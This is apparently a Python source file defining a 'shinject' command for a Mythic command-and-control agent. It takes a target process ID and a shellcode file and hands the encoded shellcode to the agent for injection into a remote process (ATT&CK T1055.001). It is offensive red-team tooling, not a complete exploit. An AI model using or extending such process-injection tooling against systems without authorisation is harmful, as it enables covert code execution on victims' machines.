from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="Target process ID to inject into",
            ),
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="Shellcode file to inject (raw PIC or Crystal Palace output)",
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject -pid 1234 -file <shellcode>"
    description = "Inject shellcode into a remote process. Supports raw PIC and Crystal Palace payloads."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1055.001"]
    argument_class = ShinjectArguments
    attributes = CommandAttributes(
        builtin=False
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        file_id = taskData.args.get_arg("file")
        file_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
            AgentFileId=file_id,
        ))

        if not file_resp.Success:
            response.Success = False
            response.Error = f"Failed to get file content: {file_resp.Error}"
            return response

        import base64
        taskData.args.add_arg("shellcode_data", base64.b64encode(file_resp.Content).decode(), ParameterType.String)
        taskData.args.remove_arg("file")

        pid = taskData.args.get_arg("pid")
        sc_len = len(file_resp.Content)
        response.DisplayParams = f"PID {pid} ({sc_len} bytes)"

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
